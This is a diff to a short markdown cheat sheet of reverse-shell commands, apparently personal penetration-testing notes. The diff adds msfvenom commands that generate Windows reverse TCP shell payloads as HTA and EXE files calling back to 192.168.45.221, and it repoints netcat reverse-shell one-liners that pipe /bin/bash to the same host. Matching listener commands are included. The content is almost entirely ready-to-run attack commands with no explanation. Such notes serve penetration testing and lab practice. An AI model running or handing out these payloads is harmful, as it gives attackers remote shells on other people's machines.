@@ -4,13 +4,21 @@
 
 <https://github.com/mthbernardes/rsg>
 
+## msfvenom
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.221 LPORT=4444 -f hta-psh -o win_rs.hta
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.221 LPORT=4444 -f exe -o win_rs.exe
+```
+
 ## general
 
 ### nc
 
 ```bash
-nc 127.0.0.1 1234 -e /bin/bash
-nc 127.0.0.1 1234 | /bin/bash | nc 127.0.0.1 2345
+nc 192.168.45.221 1234 -e /bin/bash
+
+nc 192.168.45.221 1234 | /bin/bash | nc 192.168.45.221 2345
 nc -nvlp 1234
 nc -nvlp 2345
 ```
